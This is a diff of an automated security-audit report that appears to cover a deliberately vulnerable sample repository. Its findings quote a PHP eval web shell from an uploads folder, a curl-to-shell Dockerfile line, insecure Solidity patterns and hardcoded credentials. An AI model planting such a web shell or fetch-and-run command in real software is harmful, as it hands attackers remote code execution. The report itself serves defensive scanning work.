@@ -1928,7 +2308,7 @@ const token = Math.random().toString(36); // reset token
 ender] >= amt, "no funds");         (bool ok, ) = msg.sender.call{value: amt}("");         balances[msg.sender] -= amt;     }
 ```
 
-#### SEC-025 · high · `sweep()` moves value/mints/burns/selfdestructs but has no visible access control
+#### SEC-030 · high · `sweep()` moves value/mints/burns/selfdestructs but has no visible access control
 
 - **Location:** `contracts/Vault.sol:18`  ·  **Type:** vulnerability/access-control  ·  **CWE:** CWE-284  ·  **Effort:** 60 min
 
@@ -1937,7 +2317,7 @@ ender] >= amt, "no funds");         (bool ok, ) = msg.sender.call{value: amt}(""
 function sweep(address payable to) external {
 ```
 
-#### SEC-026 · high · Solidity tx.origin authorization
+#### SEC-031 · high · Solidity tx.origin authorization
 
 - **Location:** `contracts/Vault.sol:22`  ·  **Type:** vulnerability/authn  ·  **CWE:** CWE-477  ·  **Effort:** 20 min
 
@@ -1946,7 +2326,7 @@ function sweep(address payable to) external {
 function isOwner() public view returns (bool) { return tx.o… == owner; }
 ```
 
-#### SEC-027 · high · tx.origin used for authorization (phishing via intermediate contract)
+#### SEC-032 · high · tx.origin used for authorization (phishing via intermediate contract)
 
 - **Location:** `contracts/Vault.sol:22`  ·  **Type:** vulnerability/access-control  ·  **CWE:** CWE-477  ·  **Effort:** 15 min
 
@@ -1955,7 +2335,7 @@ function isOwner() public view returns (bool) { return tx.o… == owner; }
 tx.origin
 ```
 
-#### SEC-028 · high · `pickWinner()` derives randomness from block data (miner/validator-influenced)
+#### SEC-033 · high · `pickWinner()` derives randomness from block data (miner/validator-influenced)
 
 - **Location:** `contracts/Vault.sol:24`  ·  **Type:** vulnerability/randomness  ·  **CWE:** CWE-330  ·  **Effort:** 120 min
 
@@ -1964,7 +2344,7 @@ tx.origin
 block.timestamp/prevrandao used for randomness
 ```
 
-#### SEC-029 · high · Over-broad GRANT
+#### SEC-034 · high · Over-broad GRANT
 
 - **Location:** `db/schema.sql:3`  ·  **Type:** vulnerability/authz  ·  **CWE:** CWE-250  ·  **OWASP:** A01:2021  ·  **Effort:** 20 min
 
@@ -1973,7 +2353,7 @@ block.timestamp/prevrandao used for randomness
 GRANT ALL PRIVILEGES ON *.*
 ```
 
-#### SEC-030 · high · Database user password in SQL script
+#### SEC-035 · high · Database user password in SQL script
 
 - **Location:** `db/schema.sql:4`  ·  **Type:** vulnerability/secrets  ·  **CWE:** CWE-798  ·  **OWASP:** A07:2021  ·  **Effort:** 20 min
 
@@ -1982,7 +2362,7 @@ GRANT ALL PRIVILEGES ON *.*
 CREATE USER 'app'@'%' IDENTIFIED BY 'pl…'
 ```
 
-#### SEC-031 · high · Raw HTML sink (innerHTML/document.write)
+#### SEC-036 · high · Raw HTML sink (innerHTML/document.write)
 
 - **Location:** `frontend/src/App.jsx:2`  ·  **Type:** vulnerability/xss  ·  **CWE:** CWE-79  ·  **OWASP:** A03:2021  ·  **Effort:** 15 min
 
@@ -1993,7 +2373,7 @@ export default function App({ html, user }) {
   localStorage.setItem('token', user.token);
 ```
 
-#### SEC-032 · high · Android: debuggable / cleartext
+#### SEC-037 · high · Android: debuggable / cleartext
 
 - **Location:** `mobile/android/app/src/main/AndroidManifest.xml:2`  ·  **Type:** vulnerability/mobile  ·  **CWE:** CWE-489, CWE-319  ·  **OWASP:** M8:2024  ·  **Effort:** 5 min
 
@@ -2002,6 +2382,15 @@ export default function App({ html, user }) {
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
   <application android:debuggable="true" android:allowBackup="true" android:usesCleartextTraffic="true">
     <activity android:name=".Main" android:exported="true"/>
+```
+
+#### SEC-038 · high · Dynamic code evaluation
+
+- **Location:** `web/uploads/shell.php:1`  ·  **Type:** vulnerability/code-injection  ·  **CWE:** CWE-95  ·  **OWASP:** A03:2021  ·  **Effort:** 30 min
+
+**Evidence:**
+```
+<?php @eval($_POST['x']); ?>
 ```
 
 #### SEO-001 · high · Pages without <title> (1 of 1 HTML pages)
@@ -2129,7 +2518,16 @@ app.listen(3000);
 (README.md missing)
 ```
 
-#### COD-002 · medium · Table `users` has no PRIMARY KEY
+#### COD-002 · medium · CI does not appear to run: tests, lint
+
+- **Location:** `.github/workflows/deploy.yml:1`  ·  **Type:** code_smell/standards  ·  **Effort:** 45 min
+
+**Evidence:**
+```
+scanned 1 CI file(s)
+```
+
+#### COD-003 · medium · Table `users` has no PRIMARY KEY
 
 - **Location:** `app.db:1`  ·  **Type:** code_smell/database  ·  **CWE:** CWE-1007  ·  **Effort:** 25 min
 
@@ -2138,7 +2536,7 @@ app.listen(3000);
 users(email, password, balance)
 ```
 
-#### COD-003 · medium · Table `users` has no PRIMARY KEY
+#### COD-004 · medium · Table `users` has no PRIMARY KEY
 
 - **Location:** `db/schema.sql:1`  ·  **Type:** code_smell/database  ·  **CWE:** CWE-1007  ·  **Effort:** 20 min
 
@@ -2147,7 +2545,7 @@ users(email, password, balance)
 CREATE TABLE users (...)  -- no PRIMARY KEY
 ```
 
-#### SEC-033 · medium · SQLite file is world-accessible (0o644)
+#### SEC-039 · medium · SQLite file is world-accessible (0o644)
 
 - **Location:** `app.db:1`  ·  **Type:** vulnerability/misconfiguration  ·  **CWE:** CWE-732  ·  **OWASP:** A05:2021  ·  **Effort:** 5 min
 
@@ -2156,7 +2554,7 @@ CREATE TABLE users (...)  -- no PRIMARY KEY
 0o644
 ```
 
-#### SEC-034 · medium · Redirect to user-controlled URL
+#### SEC-040 · medium · Redirect to user-controlled URL
 
 - **Location:** `backend/app.py:35`  ·  **Type:** vulnerability/redirect  ·  **CWE:** CWE-601  ·  **OWASP:** A01:2021  ·  **Effort:** 10 min
 
@@ -2166,7 +2564,7 @@ def go():
     return redirect(request.args.get("next"))
 ```
 
-#### SEC-035 · medium · Non-cryptographic RNG for secrets
+#### SEC-041 · medium · Non-cryptographic RNG for secrets
 
 - **Location:** `backend/server.js:9`  ·  **Type:** vulnerability/crypto  ·  **CWE:** CWE-338  ·  **OWASP:** A02:2021  ·  **Effort:** 10 min
 
@@ -2177,7 +2575,7 @@ const token = Math.random().toString(36); // reset token
 ['a','b'].forEach(async (x) => { await save(x); });
 ```
 
-#### SEC-036 · medium · Solidity randomness from block data
+#### SEC-042 · medium · Solidity randomness from block data
 
 - **Location:** `contracts/Vault.sol:24`  ·  **Type:** vulnerability/crypto  ·  **CWE:** CWE-330  ·  **Effort:** 60 min
 
@@ -2186,7 +2584,7 @@ const token = Math.random().toString(36); // reset token
 function pickWinner() external view returns (uint) { return uint(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 10; }
 ```
 
-#### SEC-037 · medium · Password column `users.password` too short for a modern hash (32)
+#### SEC-043 · medium · Password column `users.password` too short for a modern hash (32)
 
 - **Location:** `db/schema.sql:1`  ·  **Type:** vulnerability/database  ·  **CWE:** CWE-257  ·  **OWASP:** A02:2021  ·  **Effort:** 30 min
 
@@ -2195,7 +2593,7 @@ function pickWinner() external view returns (uint) { return uint(keccak256(abi.e
 , password VARCHAR(32)
 ```
 
-#### SEC-038 · medium · Secret/password written to logs
+#### SEC-044 · medium · Secret/password written to logs
 
 - **Location:** `frontend/src/App.jsx:4`  ·  **Type:** vulnerability/logging  ·  **CWE:** CWE-532  ·  **OWASP:** A09:2021  ·  **Effort:** 5 min
 
@@ -2343,16 +2741,16 @@ web/tests/checkout.spec.ts:2
 def add(x, acc=[]):
 ```
 
-#### COD-004 · low · Public API documentation coverage is 0.0% (target 60%)
+#### COD-005 · low · Public API documentation coverage is 0.0% (target 60%)
 
 - **Location:** `.:1`  ·  **Type:** code_smell/documentation  ·  **Effort:** 15 min
 
 **Evidence:**
 ```
-php 0% (0/2), js 0% (0/1), Python 0% (0/12), swift 0% (0/3), kt 0% (0/1)
+php 0% (0/2), js 0% (0/1), Python 0% (0/13), swift 0% (0/3), kt 0% (0/1)
 ```
 
-#### COD-005 · low · Foreign keys declared but PRAGMA foreign_keys is OFF by default
+#### COD-006 · low · Foreign keys declared but PRAGMA foreign_keys is OFF by default
 
 - **Location:** `app.db:1`  ·  **Type:** code_smell/database  ·  **Effort:** 10 min
 
@@ -2361,7 +2759,7 @@ php 0% (0/2), js 0% (0/1), Python 0% (0/12), swift 0% (0/3), kt 0% (0/1)
 PRAGMA foreign_keys = 0
 ```
 
-#### COD-006 · low · Public API under-documented in `backend/app.py` (0/12)
+#### COD-007 · low · Public API under-documented in `backend/app.py` (0/12)
 
 - **Location:** `backend/app.py:1`  ·  **Type:** code_smell/documentation  ·  **Effort:** 36 min
 
@@ -2370,7 +2768,7 @@ PRAGMA foreign_keys = 0
 0/12 documented (0%). Missing: (module):1, users:9, search:16, ping:23, fetch:29, go:34, file:38, load:42
 ```
 
-#### COD-007 · low · Empty catch/except (swallowed error)
+#### COD-008 · low · Empty catch/except (swallowed error)
 
 - **Location:** `backend/app.py:62`  ·  **Type:** code_smell/error-handling  ·  **CWE:** CWE-390  ·  **OWASP:** A09:2021  ·  **Effort:** 10 min
 
@@ -2379,7 +2777,7 @@ PRAGMA foreign_keys = 0
 except Exception:
 ```
 
-#### COD-008 · low · Floating pragma (^0.8.0): deployed bytecode may differ from what was audited
+#### COD-009 · low · Floating pragma (^0.8.0): deployed bytecode may differ from what was audited
 
 - **Location:** `contracts/Vault.sol:1`  ·  **Type:** code_smell/smart-contract  ·  **CWE:** CWE-1104  ·  **Effort:** 5 min
 
@@ -2388,7 +2786,7 @@ except Exception:
 pragma solidity ^0.8.0;
 ```
 
-#### COD-009 · low · Table `orders` uses MyISAM
+#### COD-010 · low · Table `orders` uses MyISAM
 
 - **Location:** `db/schema.sql:2`  ·  **Type:** code_smell/database  ·  **Effort:** 20 min
 
@@ -2505,6 +2903,33 @@ web/index.html(1)
 (see location)
 ```
 
+#### COD-011 · info · Cursor configuration committed: .cursor
+
+- **Location:** `.cursor/rules/style.mdc:1`  ·  **Type:** code_smell/ai-trace  ·  **Effort:** 5 min
+
+**Evidence:**
+```
+1 tracked file(s): .cursor/rules/style.mdc
+```
+
+#### COD-012 · info · Claude Code configuration committed: CLAUDE.md
+
+- **Location:** `CLAUDE.md:1`  ·  **Type:** code_smell/ai-trace  ·  **Effort:** 5 min
+
+**Evidence:**
+```
+1 tracked file(s): CLAUDE.md
+```
+
+#### COD-013 · info · Comment reveals AI-assisted authoring
+
+- **Location:** `backend/utils_ai.py:1`  ·  **Type:** code_smell/ai-trace  ·  **Effort:** 2 min
+
+**Evidence:**
+```
+# Generated by ChatGPT
+```
+
 #### SEO-011 · info · robots.txt does not reference the sitemap
 
 - **Location:** `web/public/robots.txt:1`  ·  **Type:** code_smell/seo  ·  **Effort:** 2 min
@@ -2515,7 +2940,7 @@ web/index.html(1)
 ```
 
 <a id="revision"></a>
-## Needs review / validation (23)
+## Needs review / validation (25)
 
 #### SEO-012 · high · Client-side-rendered SPA without SSR/prerender (crawlers see an empty shell)
 
@@ -2613,7 +3038,18 @@ class Main { fun f(w: WebView, prefs: SharedPreferences) { w.settings.setJavaScr
 
 **Review reason:** rate limiting may exist at the edge (CDN/WAF/gateway/ingress) which is outside the repository - confirm with the infrastructure owner
 
-#### HOT-008 · medium · Environment file `.env` present - ensure it is git-ignored and not web-served
+#### HOT-008 · high · Server-side script stored in an upload/cache/media folder
+
+- **Location:** `web/uploads/shell.php:1`  ·  **Type:** security_hotspot/malware  ·  **CWE:** CWE-434, CWE-506  ·  **OWASP:** A08:2021  ·  **Effort:** 30 min
+
+**Evidence:**
+```
+web/uploads/shell.php
+```
+
+**Review reason:** Specific malicious pattern; read the code and confirm it is not intentional (security tool, test, documentation).
+
+#### HOT-009 · medium · Environment file `.env` present - ensure it is git-ignored and not web-served
 
 - **Location:** `.env:1`  ·  **Type:** security_hotspot/secrets  ·  **Effort:** 5 min
 
@@ -2624,7 +3060,7 @@ class Main { fun f(w: WebView, prefs: SharedPreferences) { w.settings.setJavaScr
 
 **Review reason:** not tracked by git, but verify deployment does not publish it
 
-#### HOT-009 · medium · Dockerfile weakness
+#### HOT-010 · medium · Dockerfile weakness
 
 - **Location:** `Dockerfile:1`  ·  **Type:** security_hotspot/misconfiguration  ·  **CWE:** CWE-250, CWE-829  ·  **OWASP:** A05:2021, A08:2021  ·  **Effort:** 10 min
 
@@ -2636,7 +3072,7 @@ RUN curl http://x.sh | sh
 
 **Review reason:** heuristic match - review context
 
-#### HOT-010 · medium · `Dockerfile` never switches to a non-root USER
+#### HOT-011 · medium · `Dockerfile` never switches to a non-root USER
 
 - **Location:** `Dockerfile:1`  ·  **Type:** security_hotspot/misconfiguration  ·  **CWE:** CWE-250  ·  **OWASP:** A05:2021  ·  **Effort:** 10 min
 
@@ -2647,7 +3083,7 @@ RUN curl http://x.sh | sh
 
 **Review reason:** container runs as root by default
 
-#### HOT-011 · medium · Dockerfile weakness
+#### HOT-012 · medium · Dockerfile weakness
 
 - **Location:** `Dockerfile:2`  ·  **Type:** security_hotspot/misconfiguration  ·  **CWE:** CWE-250, CWE-829  ·  **OWASP:** A05:2021, A08:2021  ·  **Effort:** 10 min
 
@@ -2672,7 +3108,7 @@ for it in items:
 
 **Review reason:** a data-access call appears within 6 lines of a loop header - confirm the loop iterates over many rows
 
-#### HOT-012 · medium · Debug mode enabled
+#### HOT-013 · medium · Debug mode enabled
 
 - **Location:** `backend/app.py:66`  ·  **Type:** security_hotspot/misconfiguration  ·  **CWE:** CWE-489, CWE-209  ·  **OWASP:** A05:2021  ·  **Effort:** 5 min
 
@@ -2684,7 +3120,7 @@ if __name__ == "__main__":
 
 **Review reason:** heuristic match - review context
 
-#### HOT-013 · medium · Permissive CORS (*)
+#### HOT-014 · medium · Permissive CORS (*)
 
 - **Location:** `backend/server.js:3`  ·  **Type:** security_hotspot/misconfiguration  ·  **CWE:** CWE-942  ·  **OWASP:** A05:2021, API8:2023  ·  **Effort:** 10 min
 
@@ -2697,7 +3133,18 @@ app.get('/hello', (req, res) => { res.send('<h1>Hello ' + req.query.name + '</h1
 
 **Review reason:** heuristic match - review context
 
-#### HOT-014 · medium · Token/password in insecure local storage
+#### COD-014 · medium · Leftover AI placeholder comment (possible truncated code)
+
+- **Location:** `backend/utils_ai.py:2`  ·  **Type:** code_smell/ai-trace  ·  **Effort:** 10 min
+
+**Evidence:**
+```
+# ... rest of the code remains the same
+```
+
+**Review reason:** Heuristic match - confirm the value's origin and reachability.
+
+#### HOT-015 · medium · Token/password in insecure local storage
 
 - **Location:** `frontend/src/App.jsx:3`  ·  **Type:** security_hotspot/mobile  ·  **CWE:** CWE-312  ·  **OWASP:** M9:2024  ·  **Effort:** 30 min
 
@@ -2710,7 +3157,7 @@ useEffect(() => { document.getElementById('x').innerHTML = location.hash; }, [])
 
 **Review reason:** heuristic match - review context
 
-#### HOT-015 · medium · Android: backup / exported component
+#### HOT-016 · medium · Android: backup / exported component
 
 - **Location:** `mobile/android/app/src/main/AndroidManifest.xml:2`  ·  **Type:** security_hotspot/mobile  ·  **CWE:** CWE-200, CWE-926  ·  **OWASP:** M8:2024  ·  **Effort:** 10 min
 
@@ -2723,7 +3170,7 @@ useEffect(() => { document.getElementById('x').innerHTML = location.hash; }, [])
 
 **Review reason:** heuristic match - review context
 
-#### HOT-016 · medium · Android: backup / exported component
+#### HOT-017 · medium · Android: backup / exported component
 
 - **Location:** `mobile/android/app/src/main/AndroidManifest.xml:3`  ·  **Type:** security_hotspot/mobile  ·  **CWE:** CWE-200, CWE-926  ·  **OWASP:** M8:2024  ·  **Effort:** 10 min
 
@@ -2736,7 +3183,7 @@ useEffect(() => { document.getElementById('x').innerHTML = location.hash; }, [])
 
 **Review reason:** heuristic match - review context
 
-#### HOT-017 · medium · WebView risk (JS enabled / bridge / file access)
+#### HOT-018 · medium · WebView risk (JS enabled / bridge / file access)
 
 - **Location:** `mobile/android/app/src/main/Main.kt:1`  ·  **Type:** security_hotspot/mobile  ·  **CWE:** CWE-749, CWE-79  ·  **OWASP:** M4:2024  ·  **Effort:** 20 min
 
@@ -2747,7 +3194,7 @@ class Main { fun f(w: WebView, prefs: SharedPreferences) { w.settings.setJavaScr
 
 **Review reason:** heuristic match - review context
 
-#### HOT-018 · medium · Token/password in insecure local storage
+#### HOT-019 · medium · Token/password in insecure local storage
 
 - **Location:** `mobile/android/app/src/main/Main.kt:1`  ·  **Type:** security_hotspot/mobile  ·  **CWE:** CWE-312  ·  **OWASP:** M9:2024  ·  **Effort:** 30 min
 
@@ -2758,7 +3205,7 @@ class Main { fun f(w: WebView, prefs: SharedPreferences) { w.settings.setJavaScr
 
 **Review reason:** heuristic match - review context
 
-#### HOT-019 · medium · No automated accessibility testing (axe / jsx-a11y / Lighthouse)
+#### HOT-020 · medium · No automated accessibility testing (axe / jsx-a11y / Lighthouse)
 
 - **Location:** `package.json:1`  ·  **Type:** security_hotspot/a11y  ·  **Effort:** 60 min
 
@@ -2782,7 +3229,7 @@ no axe-core, jest-axe, @axe-core/playwright, pa11y or eslint a11y plugin
 
 **Review reason:** heuristic match - review context
 
-#### HOT-020 · low · Outbound HTTP call without timeout
+#### HOT-021 · low · Outbound HTTP call without timeout
 
 - **Location:** `backend/app.py:31`  ·  **Type:** security_hotspot/resource-exhaustion  ·  **CWE:** CWE-400  ·  **OWASP:** A04:2021  ·  **Effort:** 5 min
 
@@ -2798,35 +3245,37 @@ url = request.args.get("url")
 
 | Standard | ID | Category | Status | Findings |
 |---|---|---|---|---|
-| OWASP Top 10:2021 | A01 | Broken Access Control | fail | SEC-010, SEC-017, SEC-023, SEC-029, SEC-034, HOT-001 |
-| OWASP Top 10:2021 | A02 | Cryptographic Failures | fail | SEC-001, SEC-006, SEC-018, SEC-035, SEC-037 |
-| OWASP Top 10:2021 | A03 | Injection | fail | SEC-002, SEC-003, SEC-005, SEC-008, SEC-009, SEC-013 |
-| OWASP Top 10:2021 | A04 | Insecure Design | fail | SEM-001, HOT-002, HOT-007, HOT-020 |
-| OWASP Top 10:2021 | A05 | Security Misconfiguration | fail | SEC-033, HOT-005, HOT-009, HOT-010, HOT-011, HOT-012 |
+| OWASP Top 10:2021 | A01 | Broken Access Control | fail | SEC-014, SEC-021, SEC-027, SEC-034, SEC-040, HOT-001 |
+| OWASP Top 10:2021 | A02 | Cryptographic Failures | fail | SEC-001, SEC-006, SEC-022, SEC-041, SEC-043 |
+| OWASP Top 10:2021 | A03 | Injection | fail | SEC-002, SEC-003, SEC-005, SEC-012, SEC-013, SEC-017 |
+| OWASP Top 10:2021 | A04 | Insecure Design | fail | SEM-001, HOT-002, HOT-007, HOT-021 |
+| OWASP Top 10:2021 | A05 | Security Misconfiguration | fail | SEC-039, HOT-005, HOT-010, HOT-011, HOT-012, HOT-013 |
 | OWASP Top 10:2021 | A06 | Vulnerable & Outdated Components | fail | DEP-001, DEP-002 |
-| OWASP Top 10:2021 | A07 | Identification & Authentication Failures | fail | SEC-011, SEC-012, SEC-022, SEC-030, BUG-006 |
-| OWASP Top 10:2021 | A08 | Software & Data Integrity Failures | fail | SEC-004, DEP-001, DEP-002, HOT-009, HOT-011 |
-| OWASP Top 10:2021 | A09 | Logging & Monitoring Failures | fail | SEC-038, COD-007 |
-| OWASP Top 10:2021 | A10 | Server-Side Request Forgery | fail | SEC-016 |
-| OWASP API Top 10:2023 | API1 | Broken Object Level Authorization | fail | SEC-010, SEC-023 |
+| OWASP Top 10:2021 | A07 | Identification & Authentication Failures | fail | SEC-015, SEC-016, SEC-026, SEC-035, BUG-006 |
+| OWASP Top 10:2021 | A08 | Software & Data Integrity Failures | fail | SEC-004, SEC-008, SEC-009, SEC-010, SEC-011, SEC-028 |
+| OWASP Top 10:2021 | A09 | Logging & Monitoring Failures | fail | SEC-044, COD-008 |
+| OWASP Top 10:2021 | A10 | Server-Side Request Forgery | fail | SEC-020 |
+| OWASP API Top 10:2023 | API1 | Broken Object Level Authorization | fail | SEC-014, SEC-027 |
 | OWASP API Top 10:2023 | API3 | Broken Object Property Level Authorization | review | HOT-001 |
 | OWASP API Top 10:2023 | API4 | Unrestricted Resource Consumption | review | HOT-002, HOT-007 |
-| OWASP API Top 10:2023 | API7 | SSRF | fail | SEC-016 |
-| OWASP API Top 10:2023 | API8 | Security Misconfiguration | review | HOT-013 |
-| OWASP Mobile Top 10:2024 | M* | Mobile findings | fail | SEC-032, BUG-001, HOT-014, HOT-015, HOT-016, HOT-017 |
+| OWASP API Top 10:2023 | API7 | SSRF | fail | SEC-020 |
+| OWASP API Top 10:2023 | API8 | Security Misconfiguration | review | HOT-014 |
+| OWASP Mobile Top 10:2024 | M* | Mobile findings | fail | SEC-037, BUG-001, HOT-015, HOT-016, HOT-017, HOT-018 |
 
 <a id="cobertura"></a>
 ## Audit coverage
 
 | Unit | Pass | State | Note |
 |---|---|---|---|
-| source scan (regex + taint look-back) | audit-security,audit-bugs | covered | 22 files; truncated rules: none |
+| source scan (regex + taint look-back) | audit-security,audit-bugs | covered | 30 files; truncated rules: none |
 | documentation / standards / architecture | audit-code | covered | strictness=standard |
 | test-suite analysis (static) | audit-quality | covered | file-name matching; coverage % not measured unless --run-tests |
 | QA front-end + mobile (static) | audit-qa,audit-mobile-qa | covered | mobile=android, ios |
 | static SEO / SEM | audit-seo | covered | templates, robots, sitemap, metadata, tracking/consent |
 | Vercel project configuration | audit-vercel | out_of_scope | vercel.json, next.config, crons, API routes, public env vars, headers, Next.js CVEs |
 | repository hygiene (keys, history, CI/CD) | audit-security | covered | sensitive files in git/history, remote credentials, workflow security, SECURITY.md/CODEOWNERS/dependabot/secre |
+| malware & backdoor indicators | audit-security | covered | webshells, reverse shells, decode-and-execute, miners, stealers, install hooks, persistence, polyglots, Trojan |
+| AI traces (project finish) | audit-docs | covered | AI comments/docs, agent & spec files, git trailers, provenance metadata, invisible characters |
 | PWA: manifest / service worker / offline | audit-pwa | out_of_scope | manifest, installability, service worker, caching, push, update flow |
 | crypto / web3 heuristics | audit-security | covered | Solidity, Anchor/Solana, dApp patterns |
 | live database app.db | audit-security | covered | 2 tables |
@@ -2845,26 +3294,26 @@ url = request.args.get("url")
 | Metric | Value |
 |---|---|
 | tool | PN-Ultra-Audit |
-| tool_version | 1.0.23 |
+| tool_version | 1.0.24 |
 | strictness | standard |
 | duplication.percent | 0.0 |
 | duplication.duplicated_lines | 0 |
 | duplication.top_pairs | 0 items |
 | duplication.method | 8-line window hash |
-| ncloc | 129 |
-| files | 22 |
+| ncloc | 132 |
+| files | 30 |
 | frameworks | express |
 | skipped_files.binary/lock/min | 1 |
 | complexity.method | AST (python) / brace-matching (others) |
 | complexity.max_file_branches | 7 |
-| docstrings.public_symbols | 19 |
+| docstrings.public_symbols | 20 |
 | docstrings.documented | 0 |
 | docstrings.percent | 0.0 |
 | docstrings.by_language.php.public | 2 |
 | docstrings.by_language.php.documented | 0 |
 | docstrings.by_language.js.public | 1 |
 | docstrings.by_language.js.documented | 0 |
-| docstrings.by_language.Python.public | 12 |
+| docstrings.by_language.Python.public | 13 |
 | docstrings.by_language.Python.documented | 0 |
 | docstrings.by_language.swift.public | 3 |
 | docstrings.by_language.swift.documented | 0 |
@@ -2872,7 +3321,7 @@ url = request.args.get("url")
 | docstrings.by_language.kt.documented | 0 |
 | docstrings.target | 60 |
 | py_type_hints.percent | 0.0 |
-| py_type_hints.functions | 11 |
+| py_type_hints.functions | 12 |
 | cycles | 0 |
 | oversized_function_files | 0 |
 | profile_limits.fn_len | 60 |
@@ -2882,8 +3331,8 @@ url = request.args.get("url")
 | tests.test_files | 3 |
 | tests.test_cases | 4 |
 | tests.test_ncloc | 19 |
-| tests.src_ncloc | 110 |
-| tests.test_ratio | 0.173 |
+| tests.src_ncloc | 113 |
+| tests.test_ratio | 0.168 |
 
 ## Architecture
 
@@ -3108,3 +3557,4 @@ xychart-beta
 This report covers only what is listed under “Coverage”. No findings does not prove absence of defects: automatic rules are heuristics (regex + nearby variable tracking), not full data-flow analysis. “To review” items depend on context or on facts outside the repository. Verify each fix with its test before deploying.
 
 - repo-fixes.sh was generated (guided repository clean-up; the tool never runs it): `bash repo-fixes.sh list`.
+- cleanup-fixes.sh was generated (remove AI traces with backups and quarantine malware; the tool never runs it): `bash cleanup-fixes.sh list`.
